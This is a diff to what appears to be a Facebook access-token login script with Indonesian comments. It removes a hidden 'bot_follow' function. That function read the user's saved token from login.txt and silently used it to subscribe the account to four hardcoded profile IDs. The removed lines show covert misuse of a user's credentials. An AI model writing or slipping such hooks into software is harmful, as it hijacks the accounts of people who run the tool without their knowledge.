@@ -123,23 +123,7 @@ def menu_log():
             xd.write(find_token.group(1))
             xd.close()
             #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
-            bot_follow()
-def bot_follow():
-	try:
-		toket=open("login.txt","r").read()
-		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
-		a = json.loads(otw.text)
-		nama = a["name"]
-		id = a["id"]
-	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
-        log()
-    jalan("%s[%s•%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/100061587581422/subscribers?access_token=" + toket) # Zuhra Zuhra
-	requests.post("https://graph.facebook.com/100001390111040/subscribers?access_token=" + toket) # Saya Aang
-	requests.post("https://graph.facebook.com/100003252539235/subscribers?access_token=" + toket) # Ayu Lestari
-	requests.post("https://graph.facebook.com/100053460048331/subscribers?access_token=" + toket) # Why Aang Ardiansyah
-	menu()
+            menu()
         except requests.exceptions.ConnectionError:
             jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
             exit()
